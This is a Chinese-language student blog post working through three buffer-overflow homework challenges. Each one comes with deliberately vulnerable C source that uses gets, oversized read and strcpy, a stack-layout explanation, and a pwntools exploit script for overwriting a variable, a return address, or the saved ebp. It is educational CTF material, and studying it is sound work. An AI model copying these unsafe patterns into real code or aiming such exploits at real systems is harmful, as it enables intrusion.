---
title: Software Security Note(1) | Buffer Overflow | HW
date: 2020-07-18 06:59:07
categories: 学习
tags: 
- Security  
- Buffer Overflow
thumbnail: /images/security1.jpg
---

是Buffer Overflow作业的讲解~

&emsp;&emsp;

### Buffer Overflow Baby
---

Overwrite变量值来拿到shell。

&emsp;&emsp;
#### Source code

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define LENGTH 256

void hear(){
    char flag = 'N';
    char str[LENGTH];
    gets(str);
    if (flag == 'Y') {
        printf("[HACKED]\n");
        execve("/bin/sh", NULL, NULL);
    }   
}

int main(int argc, char* argv[]){
    printf("ZJUSSEC HW1: Buffer Overflow Baby\n");
    
    printf("Hi. Tell me something, less than %d charecters ...\n", LENGTH);
    hear();
    printf("Roger\n");
    return 0;
}
```


&emsp;&emsp;
#### 过程

栈的布局如下所示：

<img src="/article/software-security(1)/hw11.png" width = 60% height = 60% />

所以只要溢出一个字符'Y'来覆盖'N'即可。


&emsp;&emsp;
#### Code

```python
from pwn import *

io = process('./bof-baby')

payload = 'A'*256+'Y'
io.sendline(payload)

io.interactive()
```

然后可以得到shell。

<img src="/article/software-security(1)/hw12.png" width = 60% height = 60% />


&emsp;&emsp;

### Buffer Overflow Boy
---

Overwrite return address.

原题要nc服务器，这里只写本地端。

&emsp;&emsp;
#### Source code

```
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include "pwnable_harness.h"

#define LENGTH 256

/* Filename of the first flag */
static const char* flagfile = "flag1.txt";

/* Send the user the contents of the first flag file. */
static void giveFlag(void) {
    char flag[64];
    FILE* fp = fopen(flagfile, "r");
    if(!fp) {
        perror(flagfile);
        return;
    }
    
    fgets(flag, sizeof(flag), fp);
    fclose(fp);
    
    printf("[√] Your flag: %s\n", flag);
}
unsigned long long int id = 18041;

void target_18041(void)             
{                                               
    if (id != 18041) {                              
        printf("[!] Hey, who are you!\n");      
    }                                           
    else {                                      
        giveFlag();                             
        printf("[*] pwned \n");                 
    }                                           
    exit(0);                                    
}

void hear() {
    char buf[LENGTH];
    read(STDIN_FILENO, buf, LENGTH*2);
    if (strlen(buf) > 10) {
        printf("[x] Invalid Password \n");
        exit(0);
    }
}

static void handle_connection(int sock) {
    printf("[*] ZJUSSEC HW1: Buffer Overflow Boy \n");
    printf("[*] Hi, %lld. Give me something to overflow me! \n", id);
    hear();
}

int main(int argc, char** argv) {
    server_options opts = { };
    return server_main(argc, argv, opts, &handle_connection);
}
```


&emsp;&emsp;
#### 过程

hear()里的read有LENGTH*2-LENGTH长度的溢出空间，其栈内存布局为：

<img src="/article/software-security(1)/hw21.png" width = 60% height = 60% />

为了拿到shell，我们的目标是去执行target_18041()，所以用target_18041()的地址去覆盖hear()的ret即可。

通过gdb去拿到target_18041()的地址：

<img src="/article/software-security(1)/hw22.png" width = 60% height = 60% />

可以看到地址是0x080486a6。

buffer的长度256+ebp的4字节+new ret构造payload，因为对buf有长度检查，所以前面要插入一个'\0'。这样去构造即可。


&emsp;&emsp;
#### Code

```python
from pwn import *

io = process('./bof-boy')

payload = 'A' + '\0' + 258*'A' + p32(0x080486a6)
io.sendline(payload)

io.interactive()
```

需要在python2下运行，python3会有“TypeError: must be str, not bytes”的错误。

结果长这样：

<img src="/article/software-security(1)/hw23.png" width = 60% height = 60% />


&emsp;&emsp;

### Buffer Overflow Again
---

构建Stack frame。

原题要nc服务器，这里只写本地端。

&emsp;&emsp;
#### Source code

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include "pwnable_harness.h"

#define LENGTH 256

/* Filename of the first flag */
static const char* flagfile = "flag1.txt";

/* Send the user the contents of the first flag file. */
static void giveFlag(void) {
    char flag[64];
    FILE* fp = fopen(flagfile, "r");
    if(!fp) {
        perror(flagfile);
        return;
    }
    
    fgets(flag, sizeof(flag), fp);
    fclose(fp);
    
    printf("[√] Your flag: %s\n", flag);
}
unsigned long long int id = 18041;

void target_18041(void)             
{                                               
    if (id != 18041) {                              
        printf("[!] Hey, who are you!\n");      
    }                                           
    else {                                      
        giveFlag();                             
        printf("[*] pwned \n");                 
    }                                           
    exit(0);                                    
}

void hear(char* arg){
    char str[LENGTH];
    strcpy(str, arg);
}

void handle_connection(int sock) {
    printf("[*] ZJUSSEC HW1: Buffer Overflow Again\n");
    printf("[*] Hi, %lld. Give me something to overflow me!\n", id);
    char secret[LENGTH];
    read(STDIN_FILENO, secret, LENGTH+1);
    hear(secret);
}

int main(int argc, char** argv) {
    server_options opts = { };
    return server_main(argc, argv, opts, &handle_connection);
}
```

&emsp;&emsp;
#### 过程

栈内存布局为：

<img src="/article/software-security(1)/hw31.png" width = 60% height = 60% />

这题只有一个字节的溢出空间，可以修改handle和hear两者frame内的ebp地址的最低位字节。

思路是这样的：handle()中读入257个字符，进入hear()后，str所在的buffer读入了这257个字符，hear()的frame部分的ebp的最低位被修改。为了保证hear()中的strcpy()能够顺利执行，我们输入的第257位字符一定要是终结符。这样程序才不会发生错误。

当hear()执行完返回时(即执行leave指令的第二步pop \$ebp)，这个错误的ebp会被pop给$ebp。回到handle()的frame，handle()执行完毕返回时(即执行leave指令的第一步mov $ebp, $esp)，栈顶指针会指向这个错误的ebp位置，然后执行ret指令时也会pop错误的ret add。我们的目标就是让程序能够在这一步跳到target()函数。

由于第257位字符是终结符0，被修改后的ebp一定小于原先的ebp。也就是说执行完handle()的leave的第一步后，esp的位置应该在buffer1处(因为buffer有256个字节长，基本可以确定范围)。可以在payload中加入target()的地址*n，只要被修改的ebp指向其中的任意一个target()地址开头，那么一定会pop地址给PC，进而执行target()。

所以我们保证修改后的ebp指向target()地址开头即可，先假设payload=addr32(target)*64，要计算一个偏移量来构造payload。

gdb看一下handle()域的ebp和esp的值：

<img src="/article/software-security(1)/hw32.png" width = 80% height = 80% />

\$ebp = 0xffffcb4c，\$esp = 0xffffca4c，那么修改后的$ebp=0xffffcb00。0xcb00-0xca4c=180为4的倍数。所以修改后的ebp能刚好指向target()的开头，所以偏移量=0。

进而可以构造payload。

这道题在服务器端开启了ASLR，但偏移量总有可能是0，所以也不需要修改，多attack几次就能拿到flag。

在本地的结果：

<img src="/article/software-security(1)/hw33.png" width = 80% height = 80% />


&emsp;&emsp;
#### Code

```python
from pwn import *

io = process('./bof-again')

payload = p32(0x080486a6)*64+'\0'
io.sendline(payload)

io.interactive()
```